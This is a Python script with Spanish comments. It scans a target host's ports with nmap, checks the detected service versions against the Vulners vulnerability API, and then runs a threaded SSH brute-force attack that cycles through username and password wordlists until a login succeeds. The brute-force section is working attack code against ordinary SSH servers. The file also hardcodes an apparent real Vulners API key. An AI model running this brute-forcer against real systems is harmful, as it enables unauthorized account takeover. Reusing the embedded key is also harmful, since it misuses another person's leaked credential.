import nmap
import paramiko, sys, os, termcolor
import threading, time
import requests

API_KEY = 'UQDQBWYICBHJA5UVHZCYUABANRUUM7LZNQXBIOB1P22TNNWJP0FIW8BWW14YRR4T'

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1  # Limita el tamaño de la respuesta
    }
    
    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()  # Lanza un error si la respuesta HTTP es un error
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Error al consultar la API de Vulners: {e}")
        return False, {}
    except ValueError as e:
        print(f"Error al decodificar la respuesta JSON: {e}")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    vulnerabilities_found = False
    
    for host in nm.all_hosts():
        print('\n' + 'Escaneando el objetivo ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                if product and version:
                    product_version = f"{product} {version}"
                    print('[+] El puerto abierto ' + str(port) + ' esta corriendo el servicio ' + product_version)
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        print(termcolor.colored(f'Se recomienda actualizar version: "{product_version}" en puerto: {str(port)}', 'red'))
                        print('Detalles de la vulnerabilidad:')
                        print(f"  Título: {vul_data.get('title', 'No disponible')}")
                        print(f"  CVSS Score: {vul_data.get('cvss_score', 'No disponible')}")
                        print(f"  Descripción: {vul_data.get('description', 'No disponible')}")
                        print(f"  Referencias: {vul_data.get('references', 'No disponible')}\n")
                        
    if not vulnerabilities_found:
        print(termcolor.colored("¡Felicitaciones, no se han encontrado versiones vulnerables en su sistema!", "green"))
           
targets = input('Escriba el dominio o ip a escanear: ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)

# escaneo de puertos en base a txt
"""

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    
    with open('vulbanners.txt', 'r') as file:
        #vul_banners = file.read().splitlines()
        vul_banners = [line.strip() for line in file.readlines()]
    
    for host in nm.all_hosts():
        print('\n' + 'Escaneando el objetivo ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product_version = nm[host][proto][port]['product'] + ' ' + nm[host][proto][port]['version']
                print('[+] Puerto abierto ' + str(port) + ' : ' + product_version)
                if product_version in vul_banners:
                    print(termcolor.colored(('[!!] VULNERABLE BANNER: "' + product_version + '" ON PORT: ' + str(port)),'red'))
                    
targets = input('Escriba el dominio o ip a escanear: ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)
"""
    
# se empieza fuerza bruta    
stop_flag = False
max_threads = 5  # Número máximo de hilos simultáneos
thread_limiter = threading.BoundedSemaphore(max_threads)

def ssh_connect(username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = True
        print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username), 'green'))
    except paramiko.ssh_exception.AuthenticationException:
        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
    except paramiko.ssh_exception.SSHException as e:
        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
    except Exception as e:
        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
    finally:
        ssh.close()
        thread_limiter.release()

host = targets
usernames_file = "usernamesReal.txt"
passwords_file = "passwordsReal.txt"
print('\n')

if os.path.exists(passwords_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('Empezando fuerza bruta en host ' + host ) 

with open(usernames_file, 'r') as users:
    for username in users:
        username = username.strip()
        with open(passwords_file, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                if stop_flag:
                    break
                thread_limiter.acquire()
                t = threading.Thread(target=ssh_connect, args=(username, password))
                t.start()
                time.sleep(0.5)
                if stop_flag:
                    break
        if stop_flag:
            break

